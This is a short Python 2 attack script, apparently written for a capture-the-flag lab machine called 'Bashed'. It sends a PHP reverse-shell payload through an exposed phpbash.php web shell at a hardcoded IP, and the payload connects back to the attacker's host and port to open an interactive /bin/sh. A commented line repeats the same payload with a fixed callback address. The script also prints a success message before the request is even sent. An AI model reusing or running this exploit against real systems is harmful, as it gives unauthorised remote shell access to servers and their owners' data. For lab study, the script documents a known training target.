#!/usr/bin/python

import requests,time,os
from pwn import *
from colorama import Fore,init

init()


url_bashed_php = "http://10.10.10.68/dev/phpbash.php"
burp = {"http": "http://127.0.0.1:8080"}



def usage():
	print Fore.RED+"\n [+] Usage : python %s <rhost> <port> \n" % sys.argv[0]


def main (rhost,port):
#cmd=cd /var/www/html/dev; php -r '$sock=fsockopen("10.10.14.14",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
	#BANNER
	print ""
	print Fore.RED+"-"*70
	print "[!] auto_pwn_bashed [!]"
	print "-"*70
	print "\n [+] SETUP NETCAT LISTENING ON PORT : " + port
	#######################################################

	time.sleep(2)

	payload = "cd /var/www/html/dev; php -r \'$sock=fsockopen(\"" + rhost + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");\'"
	pwn_data = {
		'cmd' : payload
	}
	print ""
	p1 = log.progress("Executing payload")
	time.sleep(2)
	p1.success("PWNED as : www-data")
	r = requests.post(url_bashed_php, data=pwn_data)




if __name__ == '__main__':

	if len(sys.argv) == 3:
		rhost = sys.argv[1]
		port = sys.argv[2]
		main(rhost,port)
	else:
		usage()

